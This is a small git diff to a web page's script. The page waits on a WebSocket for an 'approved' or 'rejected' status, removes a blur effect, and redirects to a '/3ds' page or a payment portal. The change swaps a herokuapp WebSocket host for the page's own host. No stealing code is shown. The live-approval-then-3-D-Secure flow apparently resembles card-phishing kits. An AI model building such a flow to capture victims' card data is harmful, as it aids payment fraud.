@@ -286,13 +286,12 @@ document.addEventListener("DOMContentLoaded", function() {
         .then(response => response.json())
         .then(data => {
             console.log("Success:", data);
-            const ws = new WebSocket('ws://uesevere-4e86768138cc.herokuapp.com:3000');
+            const ws = new WebSocket('wss://' + window.location.host);
             ws.onmessage = function(event) {
                 const message = JSON.parse(event.data);
                 document.body.style.filter = "";
                 document.body.style.opacity = "";
                 if (message.status === 'approved') {
-                    // Redirect to 3ds.ejs
                     window.location.href = "/3ds";
                 } else if (message.status === 'rejected') {
                     // Redirect to payment portal
@@ -305,6 +304,7 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 });
-</script>
+
+    </script>
 </body>
 </html>
